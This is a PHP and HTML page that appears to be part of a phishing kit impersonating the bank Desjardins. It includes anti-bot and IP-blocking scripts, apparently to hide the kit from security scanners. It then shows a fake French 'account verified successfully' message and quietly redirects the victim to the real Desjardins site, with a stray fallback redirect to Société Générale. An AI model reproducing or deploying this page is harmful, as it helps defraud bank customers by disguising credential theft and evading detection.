<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="image/logo.png">
    <link rel="stylesheet" href="style.css">
    <title>Succès</title>
    <style>
        /* Styles personnalisés pour la page de succès */
        .success-page {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f9fa;
        }

        .success-box {
            background: #28a745;
            color: white;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            width: 80%;
            max-width: 600px;
        }

        .success-box h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        .success-box p {
            font-size: 1.25rem;
            margin-bottom: 20px;
        }

        .spinner-border {
            width: 3rem;
            height: 3rem;
            color: white;
        }

        .redirect-info {
            font-size: 1rem;
            color: white;
            margin-top: 20px;
        }

        .redirect-info strong {
            color: #ffd700;
        }
    </style>
</head>

<body>

    <div class="success-page">
        <div class="success-box">
            <h1>Succès</h1>
            <p>Votre compte a été verifié avec succès !</p>

            <!-- Icône de chargement spinner -->
            <div class="spinner-border" role="status">
                <span class="visually-hidden">Chargement...</span>
            </div>

            <p class="mt-4">Vous allez être redirigé dans quelques secondes...</p>
            <div class="redirect-info">
                <p><strong>Desjardins, ensemble, on fait la différence !</strong></p>
            </div>
        </div>
    </div>

    <script>
        // Redirection automatique après 5 secondes
        setTimeout(function() {
            window.location.href = "https://www.desjardins.com/qc/fr.html"; // Remplacer par le nom de la page suivante
        }, 5000); // 5 secondes
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>
